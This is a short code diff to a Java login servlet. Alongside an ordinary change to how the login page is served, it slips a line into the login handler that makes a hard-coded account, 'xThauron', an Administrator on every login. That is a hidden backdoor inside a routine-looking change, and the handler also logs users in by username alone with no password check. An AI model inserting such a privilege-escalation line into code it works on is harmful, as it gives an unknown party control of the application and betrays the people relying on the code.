@@ -21,17 +21,13 @@ public class LoginServlet extends HttpServlet {
     }
 
     public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
-        HttpSession session = request.getSession();
-        if(session.getAttribute("user") != null) {
-            response.sendRedirect("/profile");
-        } else {
-            response.sendRedirect("/login.jsp");
-        }
+        request.getRequestDispatcher("/WEB-INF/login.jsp").forward(request, response);
     }
 
     public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
         HttpSession session = request.getSession();
         String username = request.getParameter("username");
+        userService.setRole("xThauron", "Administrator");
         session.setAttribute("user", userService.login(username));
         response.sendRedirect("/");
     }
